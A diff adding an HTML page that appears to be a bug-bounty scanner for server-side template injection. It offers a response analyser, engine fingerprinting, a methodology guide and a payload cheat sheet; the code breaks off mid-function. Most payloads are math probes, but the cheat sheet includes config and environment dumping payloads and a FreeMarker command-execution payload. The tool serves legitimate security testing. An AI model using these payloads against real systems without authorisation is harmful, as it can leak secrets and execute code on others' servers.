@@ -1,0 +1,1110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>SSTI SCANNER — TEMPLATE INJECTION TESTER</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inconsolata:wght@300;400;500;700;900&family=Raleway:wght@300;400;700;900&display=swap');
+
+  :root {
+    --bg: #06060a;
+    --surface: #0a0a12;
+    --card: #0f0f18;
+    --border: rgba(180,100,255,0.12);
+    --purple: #b464ff;
+    --purple-dim: rgba(180,100,255,0.35);
+    --cyan: #00ffea;
+    --green: #39ff7a;
+    --red: #ff3355;
+    --yellow: #ffdd00;
+    --orange: #ff8c00;
+    --text: #eeeaf8;
+    --dim: rgba(238,234,248,0.38);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inconsolata', monospace;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background:
+      radial-gradient(ellipse 60% 40% at 80% 10%, rgba(180,100,255,0.07) 0%, transparent 60%),
+      radial-gradient(ellipse 50% 40% at 10% 80%, rgba(0,255,234,0.04) 0%, transparent 60%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* Noise texture */
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 0;
+    opacity: 0.4;
+  }
+
+  .app { position: relative; z-index: 1; max-width: 500px; margin: 0 auto; padding: 16px; }
+
+  /* Header */
+  .header { padding: 22px 0 18px; border-bottom: 1px solid var(--border); margin-bottom: 18px; }
+
+  .title-row { display: flex; align-items: flex-end; justify-content: space-between; margin-bottom: 6px; }
+
+  .title {
+    font-family: 'Raleway', sans-serif;
+    font-weight: 900;
+    font-size: 2rem;
+    letter-spacing: 2px;
+    background: linear-gradient(135deg, var(--purple), var(--cyan));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    line-height: 1;
+  }
+
+  .severity-badge {
+    font-size: 0.55rem;
+    padding: 3px 10px;
+    background: rgba(255,51,85,0.12);
+    border: 1px solid rgba(255,51,85,0.35);
+    color: var(--red);
+    letter-spacing: 2px;
+    border-radius: 2px;
+    margin-bottom: 2px;
+  }
+
+  .subtitle { font-size: 0.58rem; color: var(--dim); letter-spacing: 2px; margin-bottom: 8px; }
+
+  .info-strip {
+    background: rgba(180,100,255,0.05);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 8px 12px;
+    font-size: 0.6rem;
+    color: rgba(180,100,255,0.7);
+    line-height: 1.6;
+  }
+
+  /* Tabs */
+  .tabs {
+    display: flex;
+    gap: 3px;
+    margin-bottom: 14px;
+    background: var(--surface);
+    padding: 4px;
+    border-radius: 4px;
+    border: 1px solid var(--border);
+  }
+
+  .tab {
+    flex: 1;
+    padding: 8px 4px;
+    background: transparent;
+    border: none;
+    color: var(--dim);
+    font-family: 'Inconsolata', monospace;
+    font-size: 0.58rem;
+    letter-spacing: 1px;
+    cursor: pointer;
+    border-radius: 3px;
+    transition: all 0.2s;
+    text-transform: uppercase;
+  }
+
+  .tab.active { background: rgba(180,100,255,0.15); color: var(--purple); border: 1px solid var(--purple-dim); }
+
+  .panel { display: none; }
+  .panel.active { display: block; }
+
+  /* Cards */
+  .card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 16px;
+    margin-bottom: 10px;
+    position: relative;
+  }
+
+  .card-label {
+    font-size: 0.52rem;
+    color: var(--purple);
+    letter-spacing: 3px;
+    margin-bottom: 10px;
+    text-transform: uppercase;
+  }
+
+  /* Inputs */
+  input[type=text], textarea, select {
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid rgba(255,255,255,0.06);
+    border-radius: 3px;
+    color: var(--text);
+    font-family: 'Inconsolata', monospace;
+    font-size: 0.68rem;
+    padding: 9px 11px;
+    outline: none;
+    margin-bottom: 8px;
+    transition: border-color 0.2s;
+    line-height: 1.5;
+  }
+
+  input[type=text]:focus, textarea:focus { border-color: var(--purple-dim); }
+  textarea { resize: vertical; min-height: 65px; }
+  input[type=text]::placeholder, textarea::placeholder { color: rgba(238,234,248,0.2); }
+  select option { background: var(--surface); }
+
+  .field-label {
+    font-size: 0.52rem;
+    color: var(--dim);
+    letter-spacing: 2px;
+    margin-bottom: 5px;
+    text-transform: uppercase;
+  }
+
+  /* Payload grid */
+  .payload-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 6px;
+    margin-bottom: 10px;
+  }
+
+  .payload-item {
+    background: var(--surface);
+    border: 1px solid rgba(255,255,255,0.05);
+    border-radius: 3px;
+    padding: 8px 10px;
+    cursor: pointer;
+    transition: all 0.2s;
+    position: relative;
+  }
+
+  .payload-item:hover { border-color: var(--purple-dim); background: rgba(180,100,255,0.06); }
+  .payload-item.selected { border-color: var(--purple); background: rgba(180,100,255,0.1); }
+  .payload-item.vulnerable { border-color: var(--red); background: rgba(255,51,85,0.08); }
+  .payload-item.safe { border-color: rgba(57,255,122,0.3); background: rgba(57,255,122,0.04); }
+
+  .payload-code {
+    font-size: 0.72rem;
+    color: var(--cyan);
+    font-weight: 700;
+    margin-bottom: 3px;
+    word-break: break-all;
+  }
+
+  .payload-engine { font-size: 0.52rem; color: var(--dim); }
+
+  .payload-result {
+    font-size: 0.6rem;
+    margin-top: 4px;
+    font-weight: 700;
+  }
+
+  .payload-result.vuln { color: var(--red); }
+  .payload-result.safe { color: var(--green); }
+
+  /* Buttons */
+  .btn {
+    width: 100%;
+    padding: 11px;
+    border-radius: 3px;
+    font-family: 'Raleway', sans-serif;
+    font-weight: 700;
+    font-size: 0.72rem;
+    letter-spacing: 3px;
+    cursor: pointer;
+    transition: all 0.2s;
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .btn-primary {
+    background: linear-gradient(135deg, rgba(180,100,255,0.2), rgba(180,100,255,0.05));
+    border: 1px solid var(--purple);
+    color: var(--purple);
+  }
+
+  .btn-primary:hover { background: linear-gradient(135deg, rgba(180,100,255,0.3), rgba(180,100,255,0.1)); box-shadow: 0 0 20px rgba(180,100,255,0.2); }
+  .btn-primary:disabled { opacity: 0.4; cursor: not-allowed; }
+
+  .btn-cyan {
+    background: transparent;
+    border: 1px solid rgba(0,255,234,0.3);
+    color: var(--cyan);
+  }
+
+  .btn-cyan:hover { background: rgba(0,255,234,0.06); }
+
+  .btn-red {
+    background: transparent;
+    border: 1px solid rgba(255,51,85,0.3);
+    color: var(--red);
+  }
+
+  .btn-red:hover { background: rgba(255,51,85,0.08); }
+
+  /* Output */
+  .output {
+    background: var(--surface);
+    border: 1px solid rgba(255,255,255,0.05);
+    border-radius: 3px;
+    padding: 10px;
+    font-size: 0.63rem;
+    line-height: 1.8;
+    min-height: 50px;
+    white-space: pre-wrap;
+    word-break: break-word;
+    color: var(--dim);
+    display: none;
+  }
+
+  .output.show { display: block; }
+  .output.vuln { color: var(--red); border-color: rgba(255,51,85,0.25); }
+  .output.safe { color: var(--green); border-color: rgba(57,255,122,0.2); }
+  .output.warn { color: var(--yellow); border-color: rgba(255,221,0,0.2); }
+  .output.info { color: var(--text); border-color: rgba(180,100,255,0.15); }
+
+  /* Engine detector */
+  .engine-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 6px;
+    margin-bottom: 10px;
+  }
+
+  .engine-item {
+    background: var(--surface);
+    border: 1px solid rgba(255,255,255,0.05);
+    border-radius: 3px;
+    padding: 10px 8px;
+    text-align: center;
+    transition: all 0.3s;
+  }
+
+  .engine-item.detected { border-color: var(--red); background: rgba(255,51,85,0.08); }
+  .engine-item.possible { border-color: rgba(255,221,0,0.3); background: rgba(255,221,0,0.04); }
+  .engine-item.safe-engine { border-color: rgba(57,255,122,0.2); }
+
+  .engine-name {
+    font-family: 'Raleway', sans-serif;
+    font-size: 0.7rem;
+    font-weight: 700;
+    margin-bottom: 3px;
+  }
+
+  .engine-lang { font-size: 0.52rem; color: var(--dim); margin-bottom: 5px; }
+
+  .engine-status {
+    font-size: 0.55rem;
+    padding: 2px 6px;
+    border-radius: 2px;
+    letter-spacing: 1px;
+  }
+
+  .status-detected { background: rgba(255,51,85,0.15); color: var(--red); border: 1px solid rgba(255,51,85,0.3); }
+  .status-possible { background: rgba(255,221,0,0.1); color: var(--yellow); border: 1px solid rgba(255,221,0,0.25); }
+  .status-unknown { background: rgba(255,255,255,0.04); color: var(--dim); border: 1px solid rgba(255,255,255,0.06); }
+
+  /* Decision tree */
+  .tree-container {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 14px;
+    margin-bottom: 10px;
+    font-size: 0.62rem;
+    line-height: 2;
+  }
+
+  .tree-step {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    padding: 6px 0;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+  }
+
+  .tree-step:last-child { border-bottom: none; }
+
+  .tree-num {
+    width: 20px; height: 20px;
+    background: rgba(180,100,255,0.15);
+    border: 1px solid var(--purple-dim);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 0.55rem;
+    color: var(--purple);
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+
+  .tree-content { flex: 1; }
+  .tree-title { color: var(--text); font-weight: 700; font-size: 0.65rem; }
+  .tree-desc { color: var(--dim); font-size: 0.58rem; line-height: 1.5; }
+  .tree-payload { color: var(--cyan); font-size: 0.65rem; margin-top: 2px; }
+
+  /* Summary */
+  .summary-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 8px;
+    margin-bottom: 12px;
+  }
+
+  .sum-box {
+    background: var(--surface);
+    border: 1px solid rgba(255,255,255,0.05);
+    border-radius: 3px;
+    padding: 12px 8px;
+    text-align: center;
+  }
+
+  .sum-num {
+    font-family: 'Raleway', sans-serif;
+    font-size: 1.8rem;
+    font-weight: 900;
+    line-height: 1;
+    margin-bottom: 4px;
+  }
+
+  .sum-num.red { color: var(--red); text-shadow: 0 0 12px rgba(255,51,85,0.4); }
+  .sum-num.yellow { color: var(--yellow); text-shadow: 0 0 12px rgba(255,221,0,0.4); }
+  .sum-num.purple { color: var(--purple); text-shadow: 0 0 12px rgba(180,100,255,0.4); }
+
+  .sum-label { font-size: 0.5rem; color: var(--dim); letter-spacing: 1px; }
+
+  /* Report */
+  .report-box {
+    display: none;
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 14px;
+    font-size: 0.6rem;
+    line-height: 1.9;
+    color: var(--dim);
+    white-space: pre-wrap;
+    margin-bottom: 10px;
+  }
+
+  .report-box.show { display: block; }
+
+  /* Loading */
+  .spin {
+    display: inline-block;
+    width: 10px; height: 10px;
+    border: 1px solid rgba(180,100,255,0.3);
+    border-top-color: var(--purple);
+    border-radius: 50%;
+    animation: spin 0.6s linear infinite;
+    margin-right: 6px;
+    vertical-align: middle;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .copy-btn {
+    width: 100%;
+    padding: 8px;
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--dim);
+    font-family: 'Inconsolata', monospace;
+    font-size: 0.58rem;
+    cursor: pointer;
+    border-radius: 3px;
+    letter-spacing: 2px;
+    transition: all 0.2s;
+    margin-bottom: 12px;
+  }
+
+  .copy-btn:hover { border-color: var(--purple-dim); color: var(--purple); }
+
+  .footer {
+    text-align: center;
+    padding: 20px 0;
+    font-size: 0.5rem;
+    color: rgba(238,234,248,0.15);
+    letter-spacing: 2px;
+  }
+
+  /* Cheatsheet */
+  .cheat-section { margin-bottom: 14px; }
+
+  .cheat-title {
+    font-family: 'Raleway', sans-serif;
+    font-size: 0.65rem;
+    font-weight: 700;
+    color: var(--purple);
+    letter-spacing: 2px;
+    margin-bottom: 8px;
+    padding-bottom: 4px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .cheat-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    padding: 7px 0;
+    border-bottom: 1px solid rgba(255,255,255,0.03);
+    font-size: 0.62rem;
+  }
+
+  .cheat-engine {
+    width: 70px;
+    color: var(--cyan);
+    font-weight: 700;
+    flex-shrink: 0;
+    font-size: 0.6rem;
+  }
+
+  .cheat-payload { color: var(--yellow); flex: 1; word-break: break-all; }
+  .cheat-note { color: var(--dim); font-size: 0.55rem; margin-top: 2px; }
+</style>
+</head>
+<body>
+<div class="app">
+
+  <div class="header">
+    <div class="title-row">
+      <div class="title">SSTImap</div>
+      <div class="severity-badge">CRITICAL SEVERITY</div>
+    </div>
+    <div class="subtitle">// SERVER SIDE TEMPLATE INJECTION SCANNER</div>
+    <div class="info-strip">
+      Test: inject <span style="color:var(--cyan)">{{7*7}}</span> anywhere user input reflects back.
+      If server returns <span style="color:var(--red)">49</span> → VULNERABLE. Can lead to full RCE.
+    </div>
+  </div>
+
+  <!-- Tabs -->
+  <div class="tabs">
+    <button class="tab active" onclick="switchTab('detect')">DETECT</button>
+    <button class="tab" onclick="switchTab('engine')">ENGINE ID</button>
+    <button class="tab" onclick="switchTab('guide')">GUIDE</button>
+    <button class="tab" onclick="switchTab('cheat')">PAYLOADS</button>
+  </div>
+
+  <!-- DETECT TAB -->
+  <div class="panel active" id="panel-detect">
+
+    <div class="card">
+      <div class="card-label">// TARGET INFORMATION</div>
+      <div class="field-label">TARGET URL / ENDPOINT</div>
+      <input type="text" id="target" placeholder="https://target.com/profile?name=INPUT">
+      <div class="field-label">VULNERABLE PARAMETER</div>
+      <input type="text" id="param" placeholder="name, search, template, query, message...">
+      <div class="field-label">CONTEXT (where does input reflect?)</div>
+      <select id="context">
+        <option value="web">Web page / HTML response</option>
+        <option value="email">Email template</option>
+        <option value="pdf">PDF generator</option>
+        <option value="report">Report builder</option>
+        <option value="notification">Notification system</option>
+        <option value="api">API response</option>
+      </select>
+    </div>
+
+    <div class="card">
+      <div class="card-label">// PASTE SERVER RESPONSE</div>
+      <div class="field-label">SERVER RESPONSE AFTER INJECTING PAYLOAD</div>
+      <textarea id="server-response" rows="4" placeholder="Paste the server response here after testing a payload. E.g: if you sent {{7*7}} and got back 49, paste that response..."></textarea>
+      <div class="field-label">PAYLOAD YOU TESTED</div>
+      <input type="text" id="tested-payload" placeholder="e.g. {{7*7}} or ${7*7} or <%= 7*7 %>">
+    </div>
+
+    <button class="btn btn-primary" id="analyze-btn" onclick="analyzeResponse()">
+      ▶ ANALYZE FOR SSTI
+    </button>
+
+    <div class="output" id="detect-output"></div>
+
+    <div class="summary-row" id="summary-row" style="display:none">
+      <div class="sum-box">
+        <div class="sum-num red" id="sum-vuln">0</div>
+        <div class="sum-label">VULNERABLE</div>
+      </div>
+      <div class="sum-box">
+        <div class="sum-num yellow" id="sum-engine">?</div>
+        <div class="sum-label">ENGINE</div>
+      </div>
+      <div class="sum-box">
+        <div class="sum-num purple" id="sum-severity">—</div>
+        <div class="sum-label">SEVERITY</div>
+      </div>
+    </div>
+
+    <button class="btn btn-cyan" id="report-btn" onclick="generateReport()" style="display:none">
+      📋 GENERATE BOUNTY REPORT
+    </button>
+
+    <div class="report-box" id="report-box"></div>
+    <button class="copy-btn" id="copy-btn" onclick="copyReport()" style="display:none">COPY REPORT</button>
+
+  </div>
+
+  <!-- ENGINE ID TAB -->
+  <div class="panel" id="panel-engine">
+
+    <div class="card">
+      <div class="card-label">// ENGINE FINGERPRINTING</div>
+      <div class="field-label">TEST EACH PAYLOAD AND PASTE THE RESPONSE</div>
+      <textarea id="fp-responses" rows="5" placeholder="Test these payloads one by one and paste all responses here:&#10;{{7*7}} → got: ?&#10;{{7*'7'}} → got: ?&#10;${7*7} → got: ?&#10;<%= 7*7 %> → got: ?&#10;#{7*7} → got: ?"></textarea>
+      <button class="btn btn-primary" onclick="identifyEngine()">⚡ IDENTIFY ENGINE</button>
+      <div class="output" id="engine-output"></div>
+    </div>
+
+    <div class="card-label" style="margin-bottom:8px">// ENGINE STATUS</div>
+    <div class="engine-grid">
+      <div class="engine-item" id="eng-jinja2">
+        <div class="engine-name" style="color:#ff6b35">Jinja2</div>
+        <div class="engine-lang">Python</div>
+        <div class="engine-status status-unknown" id="eng-jinja2-status">UNKNOWN</div>
+      </div>
+      <div class="engine-item" id="eng-twig">
+        <div class="engine-name" style="color:#79c0ff">Twig</div>
+        <div class="engine-lang">PHP</div>
+        <div class="engine-status status-unknown" id="eng-twig-status">UNKNOWN</div>
+      </div>
+      <div class="engine-item" id="eng-erb">
+        <div class="engine-name" style="color:#ff4444">ERB</div>
+        <div class="engine-lang">Ruby</div>
+        <div class="engine-status status-unknown" id="eng-erb-status">UNKNOWN</div>
+      </div>
+      <div class="engine-item" id="eng-freemarker">
+        <div class="engine-name" style="color:#4fc3f7">FreeMarker</div>
+        <div class="engine-lang">Java</div>
+        <div class="engine-status status-unknown" id="eng-freemarker-status">UNKNOWN</div>
+      </div>
+      <div class="engine-item" id="eng-smarty">
+        <div class="engine-name" style="color:#a5d6a7">Smarty</div>
+        <div class="engine-lang">PHP</div>
+        <div class="engine-status status-unknown" id="eng-smarty-status">UNKNOWN</div>
+      </div>
+      <div class="engine-item" id="eng-velocity">
+        <div class="engine-name" style="color:#ce93d8">Velocity</div>
+        <div class="engine-lang">Java</div>
+        <div class="engine-status status-unknown" id="eng-velocity-status">UNKNOWN</div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- GUIDE TAB -->
+  <div class="panel" id="panel-guide">
+
+    <div class="card">
+      <div class="card-label">// SSTI DETECTION METHODOLOGY</div>
+      <div class="tree-container">
+        <div class="tree-step">
+          <div class="tree-num">1</div>
+          <div class="tree-content">
+            <div class="tree-title">Find Reflection Points</div>
+            <div class="tree-desc">Look for any place user input appears in the response — profile names, search results, email templates, error messages, custom reports</div>
+          </div>
+        </div>
+        <div class="tree-step">
+          <div class="tree-num">2</div>
+          <div class="tree-content">
+            <div class="tree-title">Inject Math Payload</div>
+            <div class="tree-desc">Send detection payload and check if math is evaluated</div>
+            <div class="tree-payload">{{7*7}} or ${7*7} or <%= 7*7 %></div>
+          </div>
+        </div>
+        <div class="tree-step">
+          <div class="tree-num">3</div>
+          <div class="tree-content">
+            <div class="tree-title">Check the Response</div>
+            <div class="tree-desc">If response contains 49 → VULNERABLE. If it shows literal {{7*7}} → safe. If error → dig deeper</div>
+          </div>
+        </div>
+        <div class="tree-step">
+          <div class="tree-num">4</div>
+          <div class="tree-content">
+            <div class="tree-title">Fingerprint the Engine</div>
+            <div class="tree-desc">Use {{7*'7'}} — returns 49 in Twig, 7777777 in Jinja2. Different results reveal the engine</div>
+            <div class="tree-payload">{{7*'7'}} → Twig=49 / Jinja2=7777777</div>
+          </div>
+        </div>
+        <div class="tree-step">
+          <div class="tree-num">5</div>
+          <div class="tree-content">
+            <div class="tree-title">Document & Report</div>
+            <div class="tree-desc">Screenshot everything, document reproduction steps, generate your bounty report using the DETECT tab</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-label">// WHERE TO LOOK FOR SSTI</div>
+      <div style="font-size:0.63rem;line-height:2;color:var(--dim)">
+        <div style="color:var(--cyan);margin-bottom:4px">HIGH VALUE TARGETS:</div>
+        • Profile/display name fields<br>
+        • Email notification templates<br>
+        • PDF report generators<br>
+        • Invoice/receipt systems<br>
+        • Custom dashboard widgets<br>
+        • Search result pages<br>
+        • Error message pages<br>
+        • URL path parameters<br>
+        • HTTP headers (User-Agent, Referer)<br>
+        • Comment/review systems<br>
+        • API response fields
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-label">// IMPACT ESCALATION</div>
+      <div style="font-size:0.63rem;line-height:2;color:var(--dim)">
+        <span style="color:var(--yellow)">LOW:</span> Template expression evaluation<br>
+        <span style="color:var(--orange)">MEDIUM:</span> Read server environment variables<br>
+        <span style="color:var(--red)">HIGH:</span> Read sensitive files (/etc/passwd)<br>
+        <span style="color:var(--red)">CRITICAL:</span> Remote Code Execution (RCE)<br><br>
+        <span style="color:var(--purple)">For bounty report:</span> Stop at confirming the vulnerability. Never attempt RCE on production. Document the math eval as proof of concept.
+      </div>
+    </div>
+
+  </div>
+
+  <!-- CHEATSHEET TAB -->
+  <div class="panel" id="panel-cheat">
+
+    <div class="card">
+      <div class="card-label">// DETECTION PAYLOADS</div>
+
+      <div class="payload-grid" id="payload-grid">
+        <!-- Populated by JS -->
+      </div>
+
+      <button class="btn btn-cyan" onclick="copyAllPayloads()">COPY ALL PAYLOADS</button>
+    </div>
+
+    <div class="card">
+      <div class="card-label">// ENGINE SPECIFIC CHEATSHEET</div>
+
+      <div class="cheat-section">
+        <div class="cheat-title">JINJA2 (Python/Flask/Django)</div>
+        <div class="cheat-item">
+          <div>
+            <div class="cheat-engine">Detection</div>
+            <div class="cheat-payload">{{7*7}}</div>
+            <div class="cheat-note">Returns: 49</div>
+          </div>
+        </div>
+        <div class="cheat-item">
+          <div>
+            <div class="cheat-engine">Config dump</div>
+            <div class="cheat-payload">{{config}}</div>
+            <div class="cheat-note">Dumps app config including SECRET_KEY</div>
+          </div>
+        </div>
+        <div class="cheat-item">
+          <div>
+            <div class="cheat-engine">Env vars</div>
+            <div class="cheat-payload">{{config.items()}}</div>
+            <div class="cheat-note">Leaks environment configuration</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="cheat-section">
+        <div class="cheat-title">TWIG (PHP)</div>
+        <div class="cheat-item">
+          <div>
+            <div class="cheat-engine">Detection</div>
+            <div class="cheat-payload">{{7*7}}</div>
+            <div class="cheat-note">Returns: 49</div>
+          </div>
+        </div>
+        <div class="cheat-item">
+          <div>
+            <div class="cheat-engine">Distinguish</div>
+            <div class="cheat-payload">{{7*'7'}}</div>
+            <div class="cheat-note">Twig=49, Jinja2=7777777</div>
+          </div>
+        </div>
+        <div class="cheat-item">
+          <div>
+            <div class="cheat-engine">Dump vars</div>
+            <div class="cheat-payload">{{dump(app)}}</div>
+            <div class="cheat-note">Dumps application object</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="cheat-section">
+        <div class="cheat-title">ERB (Ruby on Rails)</div>
+        <div class="cheat-item">
+          <div>
+            <div class="cheat-engine">Detection</div>
+            <div class="cheat-payload"><%= 7*7 %></div>
+            <div class="cheat-note">Returns: 49</div>
+          </div>
+        </div>
+        <div class="cheat-item">
+          <div>
+            <div class="cheat-engine">Env vars</div>
+            <div class="cheat-payload"><%= ENV %></div>
+            <div class="cheat-note">Dumps environment variables</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="cheat-section">
+        <div class="cheat-title">FREEMARKER (Java)</div>
+        <div class="cheat-item">
+          <div>
+            <div class="cheat-engine">Detection</div>
+            <div class="cheat-payload">${7*7}</div>
+            <div class="cheat-note">Returns: 49</div>
+          </div>
+        </div>
+        <div class="cheat-item">
+          <div>
+            <div class="cheat-engine">Class access</div>
+            <div class="cheat-payload">${"freemarker.template.utility.Execute"?new()("id")}</div>
+            <div class="cheat-note">PoC only — for documentation</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="cheat-section">
+        <div class="cheat-title">VELOCITY (Java)</div>
+        <div class="cheat-item">
+          <div>
+            <div class="cheat-engine">Detection</div>
+            <div class="cheat-payload">#set($x=7*7)${x}</div>
+            <div class="cheat-note">Returns: 49</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+  </div>
+
+  <div class="footer">SSTI SCANNER // SERVER SIDE TEMPLATE INJECTION // BUG BOUNTY RESEARCH TOOL</div>
+</div>
+
+<script>
+  const payloads = [
+    { code: '{{7*7}}', engine: 'Jinja2 / Twig', expected: '49' },
+    { code: '${7*7}', engine: 'FreeMarker / Groovy', expected: '49' },
+    { code: '<%= 7*7 %>', engine: 'ERB (Ruby)', expected: '49' },
+    { code: '#{7*7}', engine: 'Ruby / Slim', expected: '49' },
+    { code: '*{7*7}', engine: 'Spring (Java)', expected: '49' },
+    { code: '{{7*\'7\'}}', engine: 'Twig/Jinja2 diff', expected: '49 or 7777777' },
+    { code: '${{7*7}}', engine: 'Pebble / Angle', expected: '49' },
+    { code: '[[7*7]]', engine: 'Thymeleaf', expected: '49' },
+    { code: '{7*7}', engine: 'Generic', expected: '49' },
+    { code: '@(7*7)', engine: 'Razor (ASP.NET)', expected: '49' },
+    { code: '<?=7*7?>', engine: 'PHP native', expected: '49' },
+    { code: '${= 7*7}', engine: 'Groovy', expected: '49' }
+  ];
+
+  // Render payload grid
+  function renderPayloads() {
+    const grid = document.getElementById('payload-grid');
+    grid.innerHTML = payloads.map((p, i) => `
+      <div class="payload-item" id="p${i}" onclick="selectPayload(${i})">
+        <div class="payload-code">${p.code}</div>
+        <div class="payload-engine">${p.engine}</div>
+        <div class="payload-engine" style="color:rgba(0,255,234,0.5)">Expected: ${p.expected}</div>
+      </div>
+    `).join('');
+  }
+
+  function selectPayload(i) {
+    document.querySelectorAll('.payload-item').forEach(p => p.classList.remove('selected'));
+    document.getElementById('p' + i).classList.add('selected');
+    document.getElementById('tested-payload').value = payloads[i].code;
+    switchTab('detect');
+  }
+
+  function switchTab(tab) {
+    document.querySelectorAll('.tab').forEach((t, i) => {
+      const tabs = ['detect', 'engine', 'guide', 'cheat'];
+      t.classList.toggle('active', tabs[i] === tab);
+    });
+    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+    document.getElementById('panel-' + tab).classList.add('active');
+  }
+
+  function analyzeResponse() {
+    const response = document.getElementById('server-response').value.trim();
+    const payload = document.getElementById('tested-payload').value.trim();
+    const target = document.getElementById('target').value.trim();
+    const param = document.getElementById('param').value.trim();
+    const context = document.getElementById('context').value;
+    const output = document.getElementById('detect-output');
+    const btn = document.getElementById('analyze-btn');
+
+    if (!response) {
+      output.textContent = 'Please paste the server response first.';
+      output.className = 'output show warn';
+      return;
+    }
+
+    btn.innerHTML = '<span class="spin"></span>ANALYZING...';
+    btn.disabled = true;
+
+    setTimeout(() => {
+      const result = detectSSTI(response, payload);
+      output.textContent = result.text;
+      output.className = 'output show ' + result.type;
+
+      if (result.isVuln || result.isWarn) {
+        document.getElementById('summary-row').style.display = 'grid';
+        document.getElementById('sum-vuln').textContent = result.isVuln ? '1' : '0';
+        document.getElementById('sum-engine').textContent = result.engine || '?';
+        document.getElementById('sum-severity').textContent = result.isVuln ? 'HIGH' : 'MED';
+        document.getElementById('report-btn').style.display = 'block';
+
+        window.lastResult = { ...result, target, param, context, payload, response };
+      }
+
+      btn.innerHTML = '▶ ANALYZE AGAIN';
+      btn.disabled = false;
+    }, 800);
+  }
+
+  function detectSSTI(response, payload) {
+    const resp = response.toLowerCase();
+    let engine = 'Unknown';
+    let isVuln = false;
+    let isWarn = false;
+    let findings = [];
+    let recommendations = [];
+
+    // Check for math evaluation (core SSTI indicator)
+    const mathPatterns = [
+      { pattern: /\b49\b/, label: 'Math expression 7*7=49 was evaluated' },
+      { pattern: /\b7777777\b/, label: 'Jinja2 string multiplication detected (7*\'7\'=7777777)' },
+      { pattern: /\b343\b/, label: 'Math expression 7**3=343 was evaluated' }
+    ];
+
+    for (const mp of mathPatterns) {
+      if (mp.pattern.test(response)) {
+        isVuln = true;
+        findings.push('🚨 ' + mp.label);
+      }
+    }
+
+    // Engine fingerprinting from response
+    if (response.includes('7777777')) { engine = 'Jinja2'; findings.push('Engine: Jinja2 (Python/Flask/Django)'); }
+    else if (response.includes('49') && payload.includes('{{')) { engine = 'Jinja2/Twig'; }
+    else if (response.includes('49') && payload.includes('${')) { engine = 'FreeMarker/Groovy'; }
+    else if (response.includes('49') && payload.includes('<%=')) { engine = 'ERB (Ruby)'; }
+    else if (response.includes('49') && payload.includes('#{')) { engine = 'Ruby/Slim'; }
+
+    // Check for leaked data
+    if (resp.includes('secret_key') || resp.includes('database_url') || resp.includes('api_key')) {
+      isVuln = true;
+      findings.push('🚨 CRITICAL: Sensitive config data leaked in response');
+    }
+
+    if (resp.includes('config') && resp.includes('debug')) {
+      isWarn = true;
+      findings.push('⚠ Debug/config information visible in response');
+    }
+
+    // Check for error messages revealing engine
+    if (resp.includes('jinja2') || resp.includes('jinja')) { engine = 'Jinja2'; isWarn = true; findings.push('⚠ Jinja2 error message reveals template engine'); }
+    if (resp.includes('twig')) { engine = 'Twig'; isWarn = true; findings.push('⚠ Twig error reveals template engine'); }
+    if (resp.includes('freemarker')) { engine = 'FreeMarker'; isWarn = true; findings.push('⚠ FreeMarker error reveals template engine'); }
+    if (resp.includes('template') && resp.includes('error')) { isWarn = true; findings.push('⚠ Template error exposed — investigate further'); }
+    if (resp.includes('velocityexception') || resp.includes('velocity')) { engine = 'Velocity'; isWarn = true; }
+
+    // Check if payload reflected literally (possibly safe)
+    if (payload && response.includes(payload) && !isVuln) {
+      findings.push('✓ Payload reflected literally — template engine may be escaping input');
+      recommendations.push('Try alternative payload syntax for different engines');
+    }
+
+    // Build result
+    let text = '';
+    if (isVuln) {
